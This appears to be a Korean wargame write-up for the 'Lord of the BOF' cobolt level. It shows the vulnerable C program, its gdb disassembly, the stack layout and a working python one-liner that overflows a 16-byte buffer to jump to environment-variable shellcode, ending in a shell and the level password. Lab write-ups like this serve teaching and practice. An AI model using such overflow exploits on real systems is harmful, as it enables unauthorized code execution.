Gremlin -> Cobolt

**cobolt.c**
```C
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```
저번 문제와 비교했을 때, 버퍼의 크기가 줄어든 것 말고는 차이점이 없습니다. 버퍼안에 쉘코드를 넣지 못하게 하려는 방법인데 저는 환경변수를 이용해서 풀 것이기 때문에 상관이 없습니다.<br>
이번에는 환경변수를 등록하고 주소를 구하는 과정은 생략하겠습니다.<br><br>

파일을 복사하여 gdb로 까보았습니다.
```
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %ebp,%esp
0x8048433 <main+3>:	sub    %esp,16
0x8048436 <main+6>:	cmp    DWORD PTR [%ebp+8],1
0x804843a <main+10>:	jg     0x8048453 <main+35>
0x804843c <main+12>:	push   0x80484d0
0x8048441 <main+17>:	call   0x8048350 <printf>
0x8048446 <main+22>:	add    %esp,4
0x8048449 <main+25>:	push   0
0x804844b <main+27>:	call   0x8048360 <exit>
0x8048450 <main+32>:	add    %esp,4
0x8048453 <main+35>:	mov    %eax,DWORD PTR [%ebp+12]
0x8048456 <main+38>:	add    %eax,4
0x8048459 <main+41>:	mov    %edx,DWORD PTR [%eax]
0x804845b <main+43>:	push   %edx
0x804845c <main+44>:	lea    %eax,[%ebp-16]
0x804845f <main+47>:	push   %eax
0x8048460 <main+48>:	call   0x8048370 <strcpy>
0x8048465 <main+53>:	add    %esp,8
0x8048468 <main+56>:	lea    %eax,[%ebp-16]
0x804846b <main+59>:	push   %eax
0x804846c <main+60>:	push   0x80484dc
0x8048471 <main+65>:	call   0x8048350 <printf>
0x8048476 <main+70>:	add    %esp,8
0x8048479 <main+73>:	leave  
0x804847a <main+74>:	ret    
```
main+56부분으로 버퍼의 크기가 16이라는 것을 알 수 있으며, strcpy 함수는 입력의 크기를 검사하지 않기 때문에 오버플로가 일어나게 하는 함수 입니다.<br>
그럼 공격을 해보겠습니다. 이번에 등록된 환경변수의 주소는 "0xbffffe2a" 입니다.<br><br>

>>buffer[16] + SFP[4] + RET[4]<br>
>>dummy[20] + EGG's add[4]<br>

다음과 같이 공격을 할 수 있습니다.
```
[gremlin@localhost gremlin]$ ./cobolt `python -c 'print "\x90"*20 + "\x2a\xfe\xff\xbf"'`
*þÿ¿
bash$ my-pass
euid = 502
hacking exposed
```
공격에 성공한 것을 볼 수 있습니다.